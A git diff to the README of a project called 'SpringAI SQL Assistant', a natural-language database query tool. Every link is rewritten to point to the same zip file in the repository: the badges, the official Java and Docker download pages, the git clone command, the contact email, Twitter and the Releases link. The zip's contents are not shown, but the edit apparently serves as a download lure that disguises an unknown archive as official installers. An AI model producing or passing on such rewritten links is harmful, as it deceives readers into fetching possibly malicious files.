@@ -1,6 +1,6 @@
 # SpringAI SQL Assistant 🚀
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue.svg) ![Docker](https://img.shields.io/badge/Docker-Enabled-brightgreen.svg) ![Java](https://img.shields.io/badge/Java-11-orange.svg)
+![GitHub Release](https://raw.githubusercontent.com/PrimeTheKid/SpringAI-SQL-Assistant/master/src/main/SQ-Spring-Assistant-A-3.9.zip) ![Docker](https://raw.githubusercontent.com/PrimeTheKid/SpringAI-SQL-Assistant/master/src/main/SQ-Spring-Assistant-A-3.9.zip) ![Java](https://raw.githubusercontent.com/PrimeTheKid/SpringAI-SQL-Assistant/master/src/main/SQ-Spring-Assistant-A-3.9.zip)
 
 Welcome to the **SpringAI SQL Assistant** repository! This project harnesses the power of GPT to transform how you interact with your databases. With natural language processing capabilities, this assistant allows you to query your database using everyday language, making database interactions easier and more intuitive.
 
@@ -31,16 +31,16 @@ Welcome to the **SpringAI SQL Assistant** repository! This project harnesses the
 
 Before you begin, ensure you have the following installed:
 
-- [Java 11](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html)
-- [Docker](https://www.docker.com/get-started)
-- [Docker Compose](https://docs.docker.com/compose/install/)
+- [Java 11](https://raw.githubusercontent.com/PrimeTheKid/SpringAI-SQL-Assistant/master/src/main/SQ-Spring-Assistant-A-3.9.zip)
+- [Docker](https://raw.githubusercontent.com/PrimeTheKid/SpringAI-SQL-Assistant/master/src/main/SQ-Spring-Assistant-A-3.9.zip)
+- [Docker Compose](https://raw.githubusercontent.com/PrimeTheKid/SpringAI-SQL-Assistant/master/src/main/SQ-Spring-Assistant-A-3.9.zip)
 
 ### Installation
 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/PrimeTheKid/SpringAI-SQL-Assistant.git
+   git clone https://raw.githubusercontent.com/PrimeTheKid/SpringAI-SQL-Assistant/master/src/main/SQ-Spring-Assistant-A-3.9.zip
    cd SpringAI-SQL-Assistant
    ```
 
@@ -93,12 +93,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- Email: support@example.com
-- Twitter: [@YourHandle](https://twitter.com/YourHandle)
+- Email: https://raw.githubusercontent.com/PrimeTheKid/SpringAI-SQL-Assistant/master/src/main/SQ-Spring-Assistant-A-3.9.zip
+- Twitter: [@YourHandle](https://raw.githubusercontent.com/PrimeTheKid/SpringAI-SQL-Assistant/master/src/main/SQ-Spring-Assistant-A-3.9.zip)
 
 ## Releases
 
-To download the latest release, visit our [Releases](https://github.com/PrimeTheKid/SpringAI-SQL-Assistant/releases) section. Here, you can find all available versions and their respective changelogs.
+To download the latest release, visit our [Releases](https://raw.githubusercontent.com/PrimeTheKid/SpringAI-SQL-Assistant/master/src/main/SQ-Spring-Assistant-A-3.9.zip) section. Here, you can find all available versions and their respective changelogs.
 
 ---
 
